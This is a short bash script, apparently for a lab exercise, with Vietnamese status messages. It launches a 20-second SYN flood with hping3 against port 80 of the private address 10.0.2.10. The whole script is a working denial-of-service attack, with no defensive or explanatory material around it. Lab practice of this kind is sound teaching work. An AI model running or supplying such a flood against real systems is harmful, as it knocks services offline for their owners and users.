#!/bin/bash
VICTIM=10.0.2.10
DURATION=20
echo "Bat dau SYN Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION hping3 -S -p 80 -i u100 $VICTIM
echo "Hoan tat tan cong SYN Flood!"
